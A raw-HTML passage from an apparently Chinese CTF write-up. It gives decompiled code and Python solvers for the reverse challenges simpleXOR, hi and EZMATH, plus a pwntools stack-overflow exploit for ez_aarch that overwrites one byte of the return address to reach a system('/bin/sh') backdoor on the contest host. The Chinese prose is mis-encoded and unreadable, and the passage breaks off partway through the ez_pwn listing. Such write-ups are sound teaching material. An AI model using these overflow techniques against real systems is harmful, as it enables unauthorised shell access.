title="simpleXOR"></a>simpleXOR</h3><blockquote><p>ç®€å•çš„åŠ å¯†</p></blockquote><p><code>main()</code> ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4[<span class="number">72</span>]; <span class="comment">// [rsp+0h] [rbp-160h]</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">52</span>]; <span class="comment">// [rsp+120h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+154h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> j; <span class="comment">// [rsp+158h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+15Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="number">247</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;input flag:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v5);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">35</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v4[i + <span class="number">36</span>] = v5[i];</span><br><span class="line">    v4[i] = v6 ^ (v4[i + <span class="number">36</span>] + i);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">0x23</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4[j] != result_0[j] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Wrong!!!&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( j == <span class="number">35</span> )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Success!!!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…ˆåŠ ä¸‹æ ‡å€¼å†å¼‚æˆ–247ï¼Œæœ€åæ ¡éªŒå¯†æ–‡ï¼Œç®€å•è¿˜åŸï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c = [<span class="number">179</span>, <span class="number">145</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">195</span>, <span class="number">155</span>, <span class="number">206</span>, <span class="number">117</span>, <span class="number">207</span>, <span class="number">156</span>, <span class="number">154</span>, <span class="number">133</span>, <span class="number">133</span>, <span class="number">205</span>, <span class="number">184</span>, <span class="number">132</span>, <span class="number">170</span>, <span class="number">125</span>, <span class="number">189</span>, <span class="number">187</span>, <span class="number">177</span>, <span class="number">181</span>, <span class="number">150</span>, <span class="number">113</span>, <span class="number">141</span>, <span class="number">158</span>, <span class="number">134</span>, <span class="number">191</span>, <span class="number">115</span>, <span class="number">168</span>, <span class="number">163</span>, <span class="number">156</span>, <span class="number">131</span>, <span class="number">101</span>, <span class="number">158</span>, <span class="number">87</span>]</span><br><span class="line">flag = [(c[i]^<span class="number">247</span>)-i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c))]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;Dest0g3&#123;0bcgf-AdMy892-KobPW-hB6LTqG&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="hi"><a href="#hi" class="headerlink" title="hi"></a>hi</h3><p><code>main()</code> ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-ACh]</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+8h] [rbp-A8h]</span></span><br><span class="line">  <span class="type">char</span> enc[<span class="number">45</span>]; <span class="comment">// [rsp+10h] [rbp-A0h]</span></span><br><span class="line">  <span class="type">char</span> str[<span class="number">100</span>]; <span class="comment">// [rsp+40h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+A8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(str, <span class="number">0</span>, <span class="keyword">sizeof</span>(str));</span><br><span class="line">  *(_QWORD *)enc = <span class="number">0x9F8E7A1CC6486497</span>LL;</span><br><span class="line">  *(_QWORD *)&amp;enc[<span class="number">8</span>] = <span class="number">0x69EEF382E760BD46</span>LL;</span><br><span class="line">  *(_QWORD *)&amp;enc[<span class="number">16</span>] = <span class="number">0xB9C017E2E30EF749</span>LL;</span><br><span class="line">  *(_QWORD *)&amp;enc[<span class="number">24</span>] = <span class="number">0x98410148A430392C</span>LL;</span><br><span class="line">  *(_QWORD *)&amp;enc[<span class="number">32</span>] = <span class="number">0xE80E7411E5B5A939</span>LL;</span><br><span class="line">  *(_DWORD *)&amp;enc[<span class="number">40</span>] = <span class="number">0xA58BFDAC</span>;</span><br><span class="line">  enc[<span class="number">44</span>] = <span class="number">109</span>;</span><br><span class="line">  fwrite(<span class="string">&quot;input: &quot;</span>, <span class="number">1uLL</span>, <span class="number">7uLL</span>, <span class="built_in">stdout</span>);</span><br><span class="line">  fgets(str, <span class="number">46</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(str) != <span class="number">45</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">44</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="number">23</span> * str[i];</span><br><span class="line">    <span class="keyword">if</span> ( ((<span class="type">unsigned</span> <span class="type">int</span>)((v1 + x[i]) &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">24</span>) + (_BYTE)v1 + x[i] - ((<span class="type">unsigned</span> <span class="type">int</span>)((v1 + x[i]) &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">24</span>) != enc[i] )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;good!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŠ å¯†é€»è¾‘ä¸­ <code>((v1 + x[i]) &gt;&gt; 31) &gt;&gt; 24)</code> äº’å‡æŠµæ¶ˆï¼Œå‰©ä¸‹ <code>23 * str[i] + x[i] == enc[i]</code>ï¼Œç®€å•è¿˜åŸï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">enc = [<span class="number">151</span>, <span class="number">100</span>, <span class="number">72</span>, <span class="number">198</span>, <span class="number">28</span>, <span class="number">122</span>, <span class="number">142</span>, <span class="number">159</span>, <span class="number">70</span>, <span class="number">189</span>, <span class="number">96</span>, <span class="number">231</span>, <span class="number">130</span>, <span class="number">243</span>, <span class="number">238</span>, <span class="number">105</span>, <span class="number">73</span>, <span class="number">247</span>, <span class="number">14</span>, <span class="number">227</span>, <span class="number">226</span>, <span class="number">23</span>, <span class="number">192</span>, <span class="number">185</span>, <span class="number">44</span>, <span class="number">57</span>, <span class="number">48</span>, <span class="number">164</span>, <span class="number">72</span>, <span class="number">1</span>, <span class="number">65</span>, <span class="number">152</span>, <span class="number">57</span>, <span class="number">169</span>, <span class="number">181</span>, <span class="number">229</span>, <span class="number">17</span>, <span class="number">116</span>, <span class="number">14</span>, <span class="number">232</span>, <span class="number">172</span>, <span class="number">253</span>, <span class="number">139</span>, <span class="number">165</span>, <span class="number">109</span>]</span><br><span class="line">x = [<span class="number">123</span>, <span class="number">81</span>, <span class="number">243</span>, <span class="number">90</span>, <span class="number">204</span>, <span class="number">57</span>, <span class="number">249</span>, <span class="number">146</span>, <span class="number">28</span>, <span class="number">158</span>, <span class="number">88</span>, <span class="number">105</span>, <span class="number">157</span>, <span class="number">247</span>, <span class="number">253</span>, <span class="number">74</span>, <span class="number">62</span>, <span class="number">251</span>, <span class="number">29</span>, <span class="number">44</span>, <span class="number">77</span>, <span class="number">12</span>, <span class="number">112</span>, <span class="number">177</span>, <span class="number">59</span>, <span class="number">141</span>, <span class="number">37</span>, <span class="number">237</span>, <span class="number">145</span>, <span class="number">177</span>, <span class="number">115</span>, <span class="number">141</span>, <span class="number">130</span>, <span class="number">230</span>, <span class="number">231</span>, <span class="number">80</span>, <span class="number">32</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">60</span>, <span class="number">0</span>, <span class="number">58</span>, <span class="number">166</span>, <span class="number">157</span>, <span class="number">50</span>]</span><br><span class="line">flag = [((enc[i]-x[i])*gmpy2.invert(<span class="number">23</span>,<span class="number">256</span>))%<span class="number">256</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc))]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;Dest0g3&#123;f982cd79-d7a3-0874-aa0b-a5b37e4445c8&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="EZMATH"><a href="#EZMATH" class="headerlink" title="EZMATH"></a>EZMATH</h3><p>ILSpyæŸ¥çœ‹dllæ–‡ä»¶ï¼Œä¸»è¦é€»è¾‘ä»£ç ï¼š</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> &lt;Main&gt;$(<span class="built_in">string</span>[] args)</span><br><span class="line">&#123;</span><br><span class="line">Console.Write(<span class="string">&quot;Input your flag:&quot;</span>);</span><br><span class="line"><span class="built_in">string</span> text = Console.ReadLine();</span><br><span class="line"><span class="keyword">if</span> (!FormatChecker(text))</span><br><span class="line">&#123;</span><br><span class="line">err();</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">string</span> s = text.Replace(<span class="string">&quot;-&quot;</span>, <span class="built_in">string</span>.Empty);</span><br><span class="line"><span class="built_in">byte</span>[] second = Checker.Encrypt2(Checker.Encrypt1(Encoding.ASCII.GetBytes(s)));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">32</span>]</span><br><span class="line">&#123;</span><br><span class="line"><span class="number">218</span>, <span class="number">49</span>, <span class="number">230</span>, <span class="number">35</span>, <span class="number">65</span>, <span class="number">168</span>, <span class="number">134</span>, <span class="number">53</span>, <span class="number">233</span>, <span class="number">62</span>,</span><br><span class="line"><span class="number">212</span>, <span class="number">208</span>, <span class="number">127</span>, <span class="number">224</span>, <span class="number">63</span>, <span class="number">164</span>, <span class="number">36</span>, <span class="number">88</span>, <span class="number">65</span>, <span class="number">138</span>,</span><br><span class="line"><span class="number">118</span>, <span class="number">255</span>, <span class="number">107</span>, <span class="number">22</span>, <span class="number">16</span>, <span class="number">239</span>, <span class="number">61</span>, <span class="number">58</span>, <span class="number">130</span>, <span class="number">101</span>,</span><br><span class="line"><span class="number">227</span>, <span class="number">109</span></span><br><span class="line">&#125;.SequenceEqual(second))</span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(<span class="string">&quot;right!&quot;</span>);</span><br><span class="line">Console.WriteLine(<span class="string">&quot;Your flag is Dest0g3&#123;&quot;</span> + text + <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">err();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">err</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(<span class="string">&quot;err!&quot;</span>);</span><br><span class="line">Environment.Exit(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="built_in">bool</span> <span class="title">FormatChecker</span>(<span class="params"><span class="built_in">string</span> input</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">Guid result;</span><br><span class="line"><span class="keyword">return</span> Guid.TryParse(input, <span class="keyword">out</span> result);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] <span class="title">Encrypt1</span>(<span class="params"><span class="built_in">byte</span>[] a</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">List&lt;<span class="built_in">byte</span>&gt; list = <span class="keyword">new</span> List&lt;<span class="built_in">byte</span>&gt;();</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">uint</span> <span class="keyword">value</span> = (<span class="built_in">uint</span>)((<span class="built_in">ulong</span>)((<span class="built_in">long</span>)utils.Unpack32(a[(<span class="number">4</span> * i)..(<span class="number">4</span> * (i + <span class="number">1</span>))]) * <span class="number">83987L</span>) % <span class="number">4062393413u</span>L);</span><br><span class="line">list.AddRange(BitConverter.GetBytes(<span class="keyword">value</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> list.ToArray();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] <span class="title">Encrypt2</span>(<span class="params"><span class="built_in">byte</span>[] a</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">List&lt;<span class="built_in">byte</span>&gt; list = <span class="keyword">new</span> List&lt;<span class="built_in">byte</span>&gt;();</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">ulong</span> num = utils.Unpack64(a[(<span class="number">8</span> * i)..(<span class="number">8</span> * (i + <span class="number">1</span>))]);</span><br><span class="line"><span class="built_in">ulong</span> <span class="keyword">value</span> = num ^ (num &gt;&gt; <span class="number">25</span>);</span><br><span class="line">list.AddRange(BitConverter.GetBytes(<span class="keyword">value</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> list.ToArray();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å…¥å­—ç¬¦ä¸²å…ˆç» <code>Encrypt1()</code> ä»¥32ä½å½¢å¼4ä½ä¸€ç»„åšä¹˜æ³•å–æ¨¡è¿ç®—ï¼Œå†ç» <code>Encrypt2()</code> ä»¥64ä½å½¢å¼8ä½ä¸€ç»„åšxorshiftè¿ç®—ï¼Œé€æ­¥è¿˜åŸï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = [<span class="number">218</span>, <span class="number">49</span>, <span class="number">230</span>, <span class="number">35</span>, <span class="number">65</span>, <span class="number">168</span>, <span class="number">134</span>, <span class="number">53</span>, <span class="number">233</span>, <span class="number">62</span>, <span class="number">212</span>, <span class="number">208</span>, <span class="number">127</span>, <span class="number">224</span>, <span class="number">63</span>, <span class="number">164</span>, <span class="number">36</span>, <span class="number">88</span>, <span class="number">65</span>, <span class="number">138</span>, <span class="number">118</span>, <span class="number">255</span>, <span class="number">107</span>, <span class="number">22</span>, <span class="number">16</span>, <span class="number">239</span>, <span class="number">61</span>, <span class="number">58</span>, <span class="number">130</span>, <span class="number">101</span>, <span class="number">227</span>, <span class="number">109</span>]</span><br><span class="line"></span><br><span class="line">c1 = [bytes_to_long(<span class="built_in">bytes</span>(c[<span class="number">8</span>*i:<span class="number">8</span>*(i+<span class="number">1</span>)])[::-<span class="number">1</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">invert_right</span>(<span class="params">m,l</span>):</span><br><span class="line">    length = <span class="number">64</span></span><br><span class="line">    mx = (<span class="number">1</span> &lt;&lt; <span class="number">64</span>) - <span class="number">1</span></span><br><span class="line">    i,res = <span class="number">0</span>,<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i * l &lt; length:</span><br><span class="line">        mask = (mx &lt;&lt; (length - l) &amp; mx) &gt;&gt; i * l</span><br><span class="line">        tmp = m &amp; mask</span><br><span class="line">        m = m ^ tmp &gt;&gt; l &amp; mx</span><br><span class="line">        res += tmp</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">c2 = [invert_right(c1[i], <span class="number">25</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line">c3 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    c3 += <span class="built_in">list</span>(long_to_bytes(c2[i]))[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">c4 = [bytes_to_long(<span class="built_in">bytes</span>(c3[<span class="number">4</span>*i:<span class="number">4</span>*(i+<span class="number">1</span>)])[::-<span class="number">1</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line"></span><br><span class="line">c4 = [(k*inverse(<span class="number">83987</span>,<span class="number">4062393413</span>))%<span class="number">4062393413</span> <span class="keyword">for</span> k <span class="keyword">in</span> c4]</span><br><span class="line"></span><br><span class="line">c5 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    c5 += <span class="built_in">list</span>(long_to_bytes(c4[i]))[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(c5))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;28956fc4c54045a8808d42a5fab4b5f8&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="ez-aarch"><a href="#ez-aarch" class="headerlink" title="ez_aarch"></a>ez_aarch</h3><p>ä¸»è¦ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  sub_8EC();</span><br><span class="line">  func();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">__int64 <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;It&#x27;s just a easy stack overflow.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> fun2();</span><br><span class="line">&#125;</span><br><span class="line">__int64 <span class="title function_">fun2</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [xsp+10h] [xbp+10h] BYREF</span></span><br><span class="line"> </span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please leave your name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;OK, you can exploit it now.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">__int64 <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;OK, you get it !&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>armçš„aarch64æ¶æ„ï¼Œå¼€äº†PIEï¼Œä¸åé—¨åœ°å€æ¯”è¾ƒå‘ç°åªæœ‰å1ä¸ªå­—èŠ‚ä¸åŒï¼ŒæŠŠè¿”å›åœ°å€çš„å°¾1å­—èŠ‚æ”¹ä¸ºåé—¨åœ°å€å°¾1å­—èŠ‚ï¼Œç®€å•æ ˆæº¢å‡ºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26257</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.send(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">0x08</span>) + <span class="string">&#x27;\x3c&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="ez-pwn"><a href="#ez-pwn" class="headerlink" title="ez_pwn"></a>ez_pwn</h3><p>ä¸»è¦ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hackme</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1[<span class="number">10</span>]; <span class="comment">// [esp+4h] [ebp-44h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [esp+2Ch] [ebp-1Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp+30h] [ebp-18h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [esp+34h] [ebp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+38h] [ebp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"> </span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input the length of array:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)abs32(v2) &gt; <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;array is too long!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span 